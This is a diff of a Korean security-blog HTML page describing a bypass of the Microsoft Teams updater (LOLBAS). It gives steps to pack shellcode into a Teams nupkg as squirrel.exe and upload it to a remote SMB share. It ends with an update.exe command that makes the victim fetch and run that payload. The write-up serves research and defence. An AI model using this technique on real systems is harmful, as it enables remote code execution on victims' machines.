@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      202 자
+      356 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      7
        분
     </span>
   
@@ -244,24 +244,24 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>MS Teams Updater</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p>
-<p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; lolbas(Living off the land binary and script)&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB358; code execution&#xC5D0; &#xB300;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xC218;&#xC815;&#xC740; URL&#xC744; &#xD1B5;&#xD558;&#xC5EC; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC81C;&#xD488; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC704;&#xD574; &#xACF5;&#xC720;/&#xB85C;&#xCEEC; &#xD3F4;&#xB354;&#xB97C; &#xD1B5;&#xD55C; &#xB85C;&#xCEEC; &#xC5F0;&#xACB0;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC6D0;&#xACA9; SMB &#xACF5;&#xC720; &#xD3F4;&#xB354;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p>
+<li><p><code>%localappdata%\Microsoft\Teams\packages</code>&#xC5D0;&#xC11C; Microsoft Teams pre-built package&#xB97C; &#xD1B5;&#xD574; nupkg &#xD328;&#xD0A4;&#xC9C0; &#xCD94;&#xCD9C;(ex. Teams-1.3.00.27559-full.nupkg)</p>
 </li>
-<li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p>
+<li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>&#xC5D0; shellcode&#xB97C; <code>squirrel.exe</code> &#xD30C;&#xC77C;&#xB85C; &#xB123;&#xC740; &#xD6C4; &#xC555;&#xCD95;</p>
 </li>
-<li><p>metadata 계산</p>
+<li><p>metadata &#xACC4;&#xC0B0;</p>
 <p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p>
 <p>output:</p>
 <p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p>
 </li>
-<li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p>
+<li><p><code>RELEASES</code> &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; &#xC704;&#xC758; &#xACB0;&#xACFC; &#xAC12;&#xC744; &#xBCF5;&#xC0AC;&#xD574;&#xC11C; &#xC800;&#xC7A5;</p>
 </li>
-<li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p>
+<li><p><code>Teams-1.3.00.27559-full.nupkg</code>&#xC640; <code>RELEASES</code> &#xD30C;&#xC77C;&#xC744; &#xBA54;&#xC778; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB123;&#xACE0; &#xC6D0;&#xACA9; SMB &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;</p>
 </li>
 </ol>
-<p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p>
+<p>&#xD53C;&#xD574;&#xC790;&#xAC00; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xC758; &#xC6D0;&#xACA9; SMB &#xC11C;&#xBC84;&#xB85C; update&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; Microsoft Teams&#xC5D0; &#xC758;&#xD574; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>
             </div>
             <hr>
@@ -564,6 +564,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
